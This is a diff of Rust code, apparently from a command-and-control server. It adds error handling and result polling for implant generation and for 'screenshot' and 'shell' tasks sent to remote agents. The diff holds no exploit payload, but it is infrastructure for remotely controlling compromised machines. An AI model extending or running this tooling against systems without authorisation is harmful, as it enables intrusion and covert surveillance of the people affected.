@@ -371,7 +371,15 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                                         "[implant:gen:ok] {}",
                                                         output,
                                                     ))).await;
-                                                let _ = socket_lock.send(Message::Binary(buffer)).await;
+                                                if let Err(e) = socket_lock.send(Message::Binary(buffer)).await {
+                                                    error!("Error: {:?}", e);
+                                                    let _ = socket_lock.send(
+                                                        Message::Text(format!("[implant:gen:error] {}", e.to_string()))).await;
+                                                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+                                                    continue;
+                                                }
+
+                                                println!("Send OK");
             
                                                 // Add to the list (check duplicate again before adding it)
                                                 if server_lock.is_dupl_implant(&mut implant).await {
@@ -487,6 +495,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
 
                                 match args[2].as_str() {
                                     "screenshot" => {
+                                        // Set task
                                         if let Ok(_) = write_file(format!("agents/{}/task/name", ag_name.to_owned()), args[2..].join(" ").as_bytes()) {
                                             info!("Task set successfully.");
                                         } else {
@@ -496,14 +505,22 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                             continue;
                                         }
 
+                                        // Check the task result
+                                        let mut cnt: u8 = 0;
                                         loop {
                                             info!("Getting task result...");
                                             tokio::time::sleep(tokio::time::Duration::from_secs(3)).await;
 
                                             if let Ok(task_result) = read_file(format!("agents/{}/task/result", ag_name.to_owned())) {
                                                 if task_result.len() > 0 {
-                                                    info!("task result found!");
-                                                    let _ = socket_lock.send(Message::Text("[task:screenshot:ok]".to_owned())).await;
+                                                    info!("task result found.");
+                                                    let outfile = format!(
+                                                        "{}/agents/{}/screenshots/screenshot_1.png",
+                                                        server_lock.config.app_dir.display(),
+                                                        ag_name.to_owned(),
+                                                    );
+                                                    let _ = socket_lock.send(Message::Text(
+                                                        format!("[task:screenshot:ok] {}", outfile))).await;
                                                     let _ = socket_lock.send(Message::Binary(task_result)).await;
                                                     let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
 
@@ -512,6 +529,12 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                                     break;
                                                 } else {
                                                     warn!("task result is empty.");
+                                                    cnt += 1;
+                                                    if cnt > 5 {
+                                                        let _ = socket_lock.send(Message::Text("[task:error] Could not get the task result.".to_owned())).await;
+                                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+                                                        break;
+                                                    }
                                                 }
                                             } else {
                                                 error!("Could not read `task/result` file.");
@@ -520,6 +543,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                         }
                                     }
                                     "shell" => {
+                                        // Set task
                                         if let Ok(_) = write_file(format!("agents/{}/task/name", ag_name.to_owned()), args[2..].join(" ").as_bytes()) {
                                             info!("Task set successfully.");
                                         } else {
@@ -529,6 +553,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                             continue;
                                         }
 
+                                        // Check the task result
                                         let mut cnt: u8 = 0;
                                         loop {
                                             info!("Getting task result...");
@@ -536,8 +561,8 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
 
                                             if let Ok(task_result) = read_file(format!("agents/{}/task/result", ag_name.to_owned())) {
                                                 if task_result.len() > 0 {
-                                                    info!("task result found!");
-                                                    let _ = socket_lock.send(Message::Text("[task:screenshot:ok]".to_owned())).await;
+                                                    info!("task result found.");
+                                                    let _ = socket_lock.send(Message::Text("[task:shell:ok]".to_owned())).await;
                                                     let _ = socket_lock.send(Message::Binary(task_result)).await;
                                                     let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
 
